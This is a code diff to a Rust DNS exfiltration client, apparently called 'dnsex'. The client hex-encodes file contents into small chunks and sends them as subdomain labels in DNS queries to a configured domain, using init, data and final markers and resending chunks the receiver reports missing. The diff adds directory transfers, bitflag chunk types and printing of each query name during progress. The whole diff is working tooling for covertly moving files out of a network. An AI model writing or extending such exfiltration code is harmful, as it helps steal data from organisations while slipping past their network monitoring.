@@ -1,4 +1,5 @@
 use crate::error::DnsexError;
+use crate::handler::ChunkFlag;
 use hickory_client::client::{AsyncClient, ClientHandle};
 use hickory_proto::rr::{DNSClass, Name, RData, RecordType};
 use hickory_proto::udp::UdpClientStream;
@@ -16,6 +17,7 @@ const CHUNK_SIZE: usize = 30;
 pub struct ExfilPayload {
     pub filename: PathBuf,
     pub data: Vec<u8>,
+    pub is_directory: bool,
 }
 
 #[derive(Debug, Clone)]
@@ -41,10 +43,10 @@ impl Client {
         format!("{:04x}", n)
     }
 
-    fn build_fqdn(&self, hex_data: &str, seq: usize, id: &str, flag: char) -> String {
+    fn build_fqdn(&self, hex_data: &str, seq: usize, id: &str, flags: u32) -> String {
         format!(
             "{}.{}.{}.{}.{}",
-            hex_data, seq, id, flag, self.config.domain
+            hex_data, seq, id, flags, self.config.domain
         )
     }
 
@@ -68,7 +70,13 @@ impl Client {
         session_id: &str,
         total_chunks: usize,
     ) -> Result<(), DnsexError> {
-        let init_fqdn = self.build_fqdn(&hex::encode(filename), total_chunks, session_id, 'i');
+        let init_fqdn = self.build_fqdn(
+            &hex::encode(filename),
+            total_chunks,
+            session_id,
+            ChunkFlag::Init as u32,
+        );
+
         self.send_query(client, &init_fqdn).await?;
         Ok(())
     }
@@ -81,11 +89,19 @@ impl Client {
         total_chunks: usize,
     ) -> Result<(), DnsexError> {
         for (seq, chunk) in data.chunks(CHUNK_SIZE).enumerate() {
-            let data_fqdn = self.build_fqdn(&hex::encode(chunk), seq, session_id, 'd');
+            let data_fqdn =
+                self.build_fqdn(&hex::encode(chunk), seq, session_id, ChunkFlag::Data as u32);
 
             if self.config.progress {
                 let progress: f32 = (((seq + 1) as f32 / total_chunks as f32) * 100.0) as f32;
-                print!("\r[{}/{} ({:.2}%)]", seq + 1, total_chunks, progress);
+                print!(
+                    "\r[{}/{} ({:.2}%)] {}",
+                    seq + 1,
+                    total_chunks,
+                    progress,
+                    data_fqdn
+                );
+
                 let _ = std::io::stdout().flush();
             }
 
@@ -101,8 +117,15 @@ impl Client {
         client: &mut AsyncClient,
         session_id: &str,
         total_chunks: usize,
+        is_directory: bool,
     ) -> Result<Vec<usize>, DnsexError> {
-        let fin_fqdn = self.build_fqdn(&hex::encode("EOF"), total_chunks, session_id, 'f');
+        let flags = if is_directory {
+            ChunkFlag::Fin as u32 | ChunkFlag::Directory as u32
+        } else {
+            ChunkFlag::Fin as u32
+        };
+
+        let fin_fqdn = self.build_fqdn(&hex::encode("EOF"), total_chunks, session_id, flags);
         let responses = self.send_query(client, &fin_fqdn).await?;
         let mut missing: Vec<usize> = Vec::new();
 
@@ -131,7 +154,13 @@ impl Client {
 
         for &seq in missing {
             if seq < chunks.len() {
-                let data_fqdn = self.build_fqdn(&hex::encode(chunks[seq]), seq, session_id, 'd');
+                let data_fqdn = self.build_fqdn(
+                    &hex::encode(chunks[seq]),
+                    seq,
+                    session_id,
+                    ChunkFlag::Data as u32,
+                );
+
                 self.send_query(client, &data_fqdn).await?;
             }
         }
@@ -167,7 +196,7 @@ impl Client {
 
         loop {
             let missing = self
-                .send_fin(&mut client, &session_id, total_chunks)
+                .send_fin(&mut client, &session_id, total_chunks, payload.is_directory)
                 .await?;
 
             if missing.is_empty() {
